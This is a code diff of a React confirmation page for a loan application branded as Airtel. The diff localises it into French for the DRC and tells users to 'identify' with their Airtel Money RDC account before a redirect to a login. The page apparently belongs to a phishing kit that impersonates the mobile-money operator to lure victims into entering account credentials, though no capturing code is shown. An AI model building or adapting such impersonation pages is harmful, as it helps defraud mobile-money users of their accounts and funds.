@@ -25,7 +25,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
         <div style={pageStyle}>
             <div style={headerStyle}>
                 <div style={{ width: "60px" }} />
-                <img src="/airtel.svg" alt="Airtel Congo" style={logoStyle} />
+                <img src="/airtel.svg" alt="Airtel RDC" style={logoStyle} />
                 <button
                     style={menuButtonStyle}
                     onMouseOver={(e) => (e.currentTarget.style.background = "#f0f0f0")}
@@ -60,13 +60,13 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                     </div>
                     <h1
                         style={{
-                            fontSize: "30px",
+                            fontSize: "28px",
                             fontWeight: "700",
                             marginBottom: "20px",
                             color: "#10b981",
                         }}
                     >
-                        Loan Application Submitted
+                        Demande de Prêt Soumise
                     </h1>
                     <p
                         style={{
@@ -76,7 +76,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        Your loan application has been submitted. Please wait for approval.
+                        Votre demande a été envoyée avec succès. Veuillez patienter pendant son traitement.
                     </p>
                     <p
                         style={{
@@ -86,7 +86,7 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                             lineHeight: "1.6",
                         }}
                     >
-                        You will receive a confirmation message. For now, proceed to Airtel Congo.
+                        Veuillez maintenant vous identifier avec votre compte Airtel Money RDC.
                     </p>
                     <div
                         style={{
@@ -113,14 +113,14 @@ function LoanSubmittedPage({ onComplete }: LoanSubmittedPageProps) {
                                     margin: 0,
                                 }}
                             >
-                                Redirecting to Airtel Congo login...
+                                Redirection vers Airtel Money RDC...
                             </p>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <div style={footerStyle}>© 2025 Airtel Congo</div>
+            <div style={footerStyle}>© 2025 Airtel RDC</div>
         </div>
     );
 }
